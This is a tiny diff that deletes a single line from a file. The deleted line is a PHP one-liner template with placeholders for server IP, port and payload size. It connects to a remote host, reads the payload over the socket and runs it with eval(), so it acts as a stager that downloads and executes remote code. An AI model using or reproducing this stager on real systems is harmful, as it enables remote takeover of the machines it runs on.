@@ -1,1 +1,0 @@
-php -r '$s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);socket_connect($s, "{{SERVER_IP}}", {{SERVER_PORT}}); $b = ""; $d = "";for ($i=0; $i<{{PAYLOAD_SIZE}}; $i++) {$r = socket_recv($s, $d, 1, MSG_WAITALL);$b .= $d;} socket_close($s); eval($b);'
